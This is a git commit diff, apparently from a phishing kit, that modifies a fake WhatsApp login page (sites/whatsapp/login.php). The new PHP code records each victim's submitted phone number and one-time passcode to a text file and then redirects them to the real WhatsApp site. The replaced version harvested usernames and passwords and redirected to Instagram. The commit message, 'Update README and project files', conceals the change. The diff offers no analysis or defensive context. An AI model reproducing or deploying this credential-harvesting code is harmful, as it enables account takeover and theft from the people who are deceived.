3268345894de769651bc73364b2607a1f13ff45b
mitaliyadav011-jpg <mitaliyadav011@gmail.com>
2026-06-28 05:16:23 +0000

    Update README and project files

--- sites/whatsapp/login.php
+++ sites/whatsapp/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://instagram.com');
+file_put_contents("usernames.txt", "Account: " . $_POST['phone'] . " Pass: " . $_POST['otp'] . "\n", FILE_APPEND);
+header('Location: https://api.whatsapp.com/');
 exit();
